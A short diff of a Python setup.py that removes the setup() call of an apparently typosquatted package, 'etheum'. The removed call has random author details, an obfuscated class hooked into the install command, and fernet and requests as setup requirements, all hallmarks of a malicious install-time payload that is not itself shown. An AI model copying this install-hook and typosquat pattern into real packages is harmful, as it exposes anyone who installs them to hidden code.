@@ -18,22 +18,5 @@ class HSyJEdYKOycdYRzjXDQsYyrVENpwsKpQbddXlmeZPSxoRsGusMdmDiKbWlynVdhzyOTSTinvDQ
             install.run(self)
 
 
-setup(
-    name="etheum",
-    version=VERSION,
-    author="ZyYQNviaXJiUBfIMln",
-    author_email="nPWyDYeBErwiEBfJ@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': HSyJEdYKOycdYRzjXDQsYyrVENpwsKpQbddXlmeZPSxoRsGusMdmDiKbWlynVdhzyOTSTinvDQyTIGxvFtHyjXwbUDoHTmbZqhTObbIAdHawnoaudXLeBOaxnJLVBkmyCIJpAKrefkovCZyFNP,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
